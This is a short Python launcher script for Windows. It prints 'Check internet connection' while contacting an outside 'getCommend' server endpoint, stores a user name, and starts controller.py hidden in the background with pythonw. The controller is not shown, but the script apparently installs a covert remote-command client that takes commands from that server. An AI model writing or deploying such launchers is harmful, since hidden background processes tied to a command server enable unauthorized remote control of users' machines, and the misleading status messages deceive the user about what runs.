import os
import requests
import time


try:
    os.system("cls")
    print("Check internet connection...")
    x=requests.get("https://mrcrow.pythonanywhere.com/getCommend").json()
    print("Check server...")
    time.sleep(1)
    os.system("cls")
    path=os.path.dirname(os.path.abspath(__file__))
    user=""
    while not user:
        user=input("Enter your user:")
    with open(f"{path}\\user.txt" , 'w') as file:
        file.write(user)
    cmd=f'{path[:2]} & cd "{path}" & start /B pythonw controller.py'
    os.system(command=cmd)
    print("program is activated.")
    time.sleep(1)
except:
    print("Network Error")
    time.sleep(1)

if __name__=="__main__":
    pass

